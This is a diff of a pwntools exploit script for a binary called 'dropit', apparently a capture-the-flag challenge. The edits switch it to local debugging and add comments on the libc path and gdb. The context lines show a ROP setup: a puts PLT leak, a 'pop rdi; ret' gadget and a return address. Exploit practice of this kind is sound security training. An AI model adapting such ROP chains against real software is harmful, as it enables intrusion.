@@ -1,8 +1,11 @@
 from pwn import *
 from struct import *
 
-_remote=1
-_debug=0
+#set to 0 if run in local
+_remote=0
+#set to 1 to show the leaked address
+_debug=1
+#set to 1 if you want to attach to gdb in local machine
 _gdb=0
 
 prog="./dropit"
@@ -14,8 +17,8 @@ if _remote:
 else:
 	proc=process(prog)
 	#ldd dropit <-- to check the libc in your environment
-	libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
-
+	libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")		#<<==== modify this path to the patch of your libc file
+													#<<==== can find with "ldd dropit" command
 
 if _gdb and _debug and _remote==0:
 	gdb.attach(proc, '''
@@ -58,7 +61,7 @@ addr_ret=0x401194
 plt_puts= elf_prog.plt['puts']
 
 
-# ROPgadget --binary dropit --only "pop|ret"
+#ROPgadget --binary dropit --only "pop|ret"
 #0x0000000000401203 : pop rdi ; ret
 pop_rdi_ret=0x0000000000401203
 
